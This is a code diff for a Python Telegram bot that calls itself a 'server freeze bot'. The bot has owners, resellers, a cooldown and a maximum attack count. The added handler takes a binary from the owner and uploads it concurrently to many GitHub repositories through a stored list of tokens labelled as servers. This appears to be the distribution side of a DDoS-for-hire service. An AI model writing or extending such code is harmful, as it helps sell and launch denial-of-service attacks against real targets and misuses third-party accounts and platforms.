@@ -1527,3 +1527,93 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
                 reply_markup=get_cancel_keyboard()
     )
 
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in user_states or user_states[user_id] is None:
+        return
+    state_info = user_states[user_id]
+    state = state_info.get("state")
+    if state == WAITING_FOR_BINARY:
+        if not is_owner(user_id):
+            await update.message.reply_text("⚠️ ACCESS DENIED")
+            user_states[user_id] = None
+            return
+        progress_msg = await update.message.reply_text("📥 DOWNLOADING BINARY FILE...")
+        try:
+            file = await update.message.document.get_file()
+            file_path = f"temp_binary_{user_id}.bin"
+            await file.download_to_drive(file_path)
+            with open(file_path, 'rb') as f:
+                binary_content = f.read()
+            file_size = len(binary_content)
+            await progress_msg.edit_text(
+                f"📊 FILE DOWNLOADED: {file_size} bytes\n\n📤 Uploading to servers..."
+            )
+            success_count = 0
+            results = []
+            def upload_to_repo(token_data):
+                try:
+                    g = Github(token_data['token'])
+                    repo = g.get_repo(token_data['repo'])
+                    try:
+                        existing_file = repo.get_contents(BINARY_FILE_NAME)
+                        repo.update_file(
+                            BINARY_FILE_NAME,
+                            "Update binary file",
+                            binary_content,
+                            existing_file.sha,
+                            branch="main"
+                        )
+                        results.append((token_data['username'], True))
+                    except:
+                        repo.create_file(
+                            BINARY_FILE_NAME,
+                            "Upload binary file",
+                            binary_content,
+                            branch="main"
+                        )
+                        results.append((token_data['username'], True))
+                except Exception as e:
+                    results.append((token_data['username'], False))
+            threads = []
+            for token_data in github_tokens:
+                thread = threading.Thread(target=upload_to_repo, args=(token_data,))
+                threads.append(thread)
+                thread.start()
+            for thread in threads:
+                thread.join()
+            for username, success in results:
+                if success:
+                    success_count += 1
+            os.remove(file_path)
+            await progress_msg.edit_text(
+                f"✅ BINARY UPLOAD COMPLETED!\n\n✅ Successful: {success_count}\n❌ Failed: {len(github_tokens) - success_count}\n📊 Total: {len(github_tokens)}\n\n📁 FILE: {BINARY_FILE_NAME}\n📦 SIZE: {file_size} bytes",
+                reply_markup=get_back_keyboard()
+            )
+            user_states[user_id] = None
+        except Exception as e:
+            await progress_msg.edit_text(
+                f"❌ ERROR\n\n{str(e)}",
+                reply_markup=get_back_keyboard()
+            )
+            user_states[user_id] = None
+
+def main():
+    application = Application.builder().token(BOT_TOKEN).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CallbackQueryHandler(button_handler))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
+    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    print("🤖 SERVER FREEZE BOT IS RUNNING...")
+    print(f"👑 Primary owners: {[uid for uid, info in owners.items() if info.get('is_primary', False)]}")
+    print(f"👑 Secondary owners: {[uid for uid, info in owners.items() if not info.get('is_primary', False)]}")
+    print(f"📊 Approved users: {len(approved_users)}")
+    print(f"💰 Resellers: {len(resellers)}")
+    print(f"🔑 Servers: {len(github_tokens)}")
+    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
+    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
+    print(f"🎯 Max attacks: {MAX_ATTACKS}")
+    application.run_polling()
+
+if __name__ == '__main__':
+    main()
